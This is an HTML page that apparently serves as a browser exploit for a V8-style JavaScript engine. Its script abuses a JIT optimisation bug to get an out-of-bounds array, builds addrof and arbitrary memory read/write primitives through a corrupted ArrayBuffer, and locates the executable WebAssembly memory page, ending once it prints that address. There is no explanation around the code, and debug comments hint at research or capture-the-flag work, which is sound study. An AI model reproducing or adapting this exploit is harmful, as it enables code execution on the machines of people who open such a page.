<html>

<body>
    <h1> test </h1>
    <script>
        function print(str) {
            document.write("<p>" + str + "</p>");
        }
        var f64 = new Float64Array(1);
        var u32 = new Uint32Array(f64.buffer);


        function d2u(v) {
            f64[0] = v;
            return u32;
        }

        function u2d(lo, hi) {
            u32[0] = lo;
            u32[1] = hi;
            return f64[0];
        }

        function print(str) {
            document.write("<p>" + str + "</p>");
        }


        // 32-bit unsigned integer to hex **string**
        function hex(i) {
            return "0x" + i.toString(16).padStart(8, "0");
        }


        function wasm_func() {
            var wasmImports = {
                env: {
                    puts: function puts(index) {
                        console.log(index);
                    }
                }
            };
            var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 137, 128, 128, 128, 0, 2,
                96, 1, 127, 1, 127, 96, 0, 0, 2, 140, 128, 128, 128, 0, 1, 3, 101, 110, 118, 4, 112, 117,
                116, 115, 0, 0, 3, 130, 128, 128, 128, 0, 1, 1, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5,
                131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 146, 128, 128, 128, 0, 2, 6,
                109, 101, 109, 111, 114, 121, 2, 0, 5, 104, 101, 108, 108, 111, 0, 1, 10, 141, 128, 128,
                128, 0, 1, 135, 128, 128, 128, 0, 0, 65, 16, 16, 0, 26, 11, 11, 146, 128, 128, 128, 0, 1, 0,
                65, 16, 11, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 0]);
            let m = new WebAssembly.Instance(new WebAssembly.Module(buffer), wasmImports);
            let h = new Uint8Array(m.exports.memory.buffer);
            return m.exports.hello;
        }
        func = wasm_func();

        function gc() {
            for (let i = 0; i < 0x10; i++) {
                new Array(0x100000);
            }
        }

        const max_size = 10000;
        var obj_array = undefined;
        var ab = undefined;

        function trigger(str, flag) {
            var x = 0;
            var k = 0;
            str = str | 0;
            str = Math.min(str, 2);
            str = Math.max(str, 1);
            if (str == 1) {
                str = "3";
            }
            for (var i = str; i < 0x1000; i -= x) {
                if (++k > 1) {
                    break;
                }
            }

            if (typeof i == 'string') {
                i = 1;
            }

            i += 1; //range(2,3)
            i -= 3; //range(-1,0)
            if (flag) i = 0;
            let arr = Array(i);
            arr.shift();
            let arr_two = [1.1, 2.2, 3.3];
            obj_array = { m: 1337, target: gc };
            return [i, arr, arr_two];
        };

        /*
        %PrepareFunctionForOptimization(trigger);
        result = trigger(1 + 20000 % 2);
        %OptimizeFunctionOnNextCall(trigger);
        */


        for (let i = 0; i < 10000; ++i) {
            trigger(1 + i % 2, 1);
        }

        result = trigger(1 + 20000 % 2, 0);
        let o = result[1];
        let oob_array = result[2];
        print(o.length);
        o[16] = 0x414141;
        ab = new ArrayBuffer(0x1337);
        var object_idx = undefined;
        var object_idx_flag = undefined;
        for (let i = 0; i < max_size; i++) {
            if (d2u(oob_array[i])[0] == 0xa72) {
                print("m: i: " + i + " lo 0");
                print("target: i: " + i + " hi 1");
                object_idx = i;
                object_idx_flag = 1;
                break;
            }
            if (d2u(oob_array[i])[1] == 0xa72) {
                print("m: i: " + i + " hi 1");
                print("target: i: " + (i + 1) + " lo 0");
                object_idx = i + 1;
                object_idx_flag = 0;
                break;
            }
        }
        //%SystemBreak();

        function addrof(obj_para) {
            obj_array.target = obj_para;
            print(hex((d2u(oob_array[object_idx])[object_idx_flag] - 1)));
            return d2u(oob_array[object_idx])[object_idx_flag] - 1;
        }

        var ab_addr = addrof(ab);
        //%SystemBreak();

        var bk_idx = undefined;
        var bk_idx_flag = undefined;
        let flag = 0;
        for (let i = 0; i < max_size; i++) {
            if (d2u(oob_array[i])[0] == 0x1337) {
                print("m: i: " + i + " lo 0");
                print("target: i: " + i + " hi 1");
                bk_idx = i;
                bk_idx_flag = 1;
                break;
            }
            if (d2u(oob_array[i])[1] == 0x1337) {
                print("m: i: " + i + " hi 1");
                print("target: i: " + (i + 1) + " lo 0");
                bk_idx = i + 1;
                bk_idx_flag = 0;
                break;
            }
        }

        var dv = new DataView(ab);
        var bk_addr = d2u(oob_array[bk_idx]);

        function get_32(addr) {
            var r8 = d2u(oob_array[bk_idx]);
            //%DebugPrint(oob_array);
            //%SystemBreak();
            if (bk_idx_flag == 0) {
                oob_array[bk_idx] = u2d(addr, r8[1]);
            }
            else {
                oob_array[bk_idx] = u2d(r8[0], addr);
            }
            //%DebugPrint(oob_array);
            //%SystemBreak();
            return dv.getUint32(0, true);
        }

        function set_32(addr, val) {
            var r8 = d2u(oob_array[bk_idx]);
            if (bk_idx_flag == 0) {
                oob_array[bk_idx] = u2d(addr, r8[1]);
            }
            else {
                oob_array[bk_idx] = u2d(r8[0], addr);
            }
            dv.setUint32(0, val, true);
        }
        function set_8(addr, val) {
            var r8 = d2u(oob_array[bk_idx]);
            if (bk_idx_flag == 0) {
                oob_array[bk_idx] = u2d(addr, r8[1]);
            }
            else {
                oob_array[bk_idx] = u2d(r8[0], addr);
            }
            dv.setUint8(0, val, true);
        }
        var wasm_func_addr = addrof(func);
        print("wasm_func_addr is: " + hex(wasm_func_addr));
        var shared_info_addr = get_32(wasm_func_addr + 0xC) - 1;
        print("shared_info_addr is: " + hex(shared_info_addr));
        var export_function_data_addr = get_32(shared_info_addr + 0x4) - 1;
        print("export_function_data_addr is: " + hex(export_function_data_addr));
        var wasm_instance_addr = get_32(export_function_data_addr + 0x8) - 1
        print("wasm_instance_addr is: " + hex(wasm_instance_addr));
        var rwx_addr = get_32(wasm_instance_addr + 64);
        print("rwx addr is: " + hex(rwx_addr));
    </script>
</body>

</html>